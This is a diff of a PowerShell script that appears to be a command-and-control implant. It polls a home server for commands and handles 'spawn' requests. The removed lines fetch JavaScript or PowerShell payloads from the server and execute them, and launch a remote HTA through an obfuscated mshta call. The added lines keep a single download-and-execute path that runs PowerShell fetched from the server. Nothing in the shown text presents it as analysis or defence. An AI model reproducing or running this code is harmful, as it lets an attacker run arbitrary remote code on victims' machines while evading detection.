@@ -60,26 +60,14 @@ while ($True) {
 			exit
 		}
 
-		elseif($jsObject['cmnd'].StartsWith("spawn")) {
-			try {
-        if($jsObject['cmnd'] -eq "spawn js") {
-				  $req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn js`"}"
-				  $selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
-          $selfpath = "$env:temp\$id.js"
-          Set-Content -Path "$selfpath" -Value "$selfdata"
-				  Start-Process "$selfpath"
-        }
-        elseif($jsObject['cmnd'] -eq "spawn hta") {
-          Start-Process "xmxsxhxtxax".replace("x","") -ArgumentList "$url/r/b.hta"
-        }
-        else {
-				  $req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn ps1`"}"
-				  $selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
-				  $selfdata = $selfdata.replace('"','"""')
-				  Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
-        }
+    if($jsObject['cmnd'] -eq "spawn") {
+		 try {
+			  $req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn ps1`"}"
+			  $selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
+			  $selfdata = $selfdata.replace('"','"""')
+			  Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
 				$retval = "[+] Spawn success..."
-			}
+      }
 			catch {
 				$retval = "[-] Spawn failed..."
 			}
@@ -93,7 +81,7 @@ while ($True) {
 			}
 		}
 		if(!($retval)) {
-			$retval = "[-] No results returned"
+			$retval = "[*] No output returned"
 		}
 
     $jsObject.cmnd = ""
